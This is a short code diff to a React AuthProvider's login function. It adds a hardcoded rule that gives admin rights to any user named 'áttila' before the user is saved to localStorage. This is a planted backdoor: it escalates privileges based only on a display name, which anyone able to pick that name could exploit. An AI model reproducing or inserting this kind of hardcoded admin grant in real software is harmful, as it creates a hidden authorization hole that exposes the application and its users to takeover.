@@ -48,6 +48,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
         if (foundUser) {
             const { password, ...userData } = foundUser;
+            // Always set 'áttila' as admin
+            if (userData.name.toLowerCase() === 'áttila') {
+                userData.isAdmin = true;
+            }
             localStorage.setItem('maua-user', JSON.stringify(userData));
             setUser(userData);
             return true;
